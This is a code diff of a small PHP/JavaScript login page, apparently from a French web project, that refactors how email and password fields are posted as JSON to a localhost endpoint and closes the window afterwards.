@@ -4,9 +4,7 @@
         <meta charset="utf-8" />
         <title>Titre</title>
         <SCRIPT LANGUAGE="javascript">
-        var logJSON;
-        var _urlLog;
-
+        
 		function check(url , json) {
 			$.post(url, json)
 			.done(function(datas) { 
@@ -18,11 +16,11 @@
 			.fail(function(datas) { 
 				alert(datas['error']); 
 			})
-			}
+			;}
 
 		function jsonData(token) {
 			var token_ext = token ;
-			_urlLog = 'https://localhost/projetFU/Communication/cible3.php?action=MAJ-login&token_ext='+token_ext;
+			var _urlLog = 'http://localhost/projetFU/Communication/cible3.php?action=MAJ-login&token_ext='+token_ext;
 			var login = document.getElementById("email");
 			var password = document.getElementById("pass");
 			var log = login.value;
@@ -30,9 +28,11 @@
 			if (log && pass){
 				var jsonLog = {email: log ,password: pass};
 				var postLog = JSON.stringify(jsonLog);
-				logJSON = {log:postLog};
+				var logJSON = {log:postLog};
 				check(_urlLog, logJSON);
+				//$.post(_urlLog,logJSON);
 				//$(this).dialog('destroy');
+				window.close();
 			}
 		}
 		</SCRIPT>
@@ -40,7 +40,7 @@
     </head>
  
     <body>
-	   <form method="post" action="traitement.php">
+	   <form method="post">
 	   <p>
 	   		<?php 
 				$token_ext = isset($_GET['token_ext']) ? htmlspecialchars($_GET['token_ext']) : null;
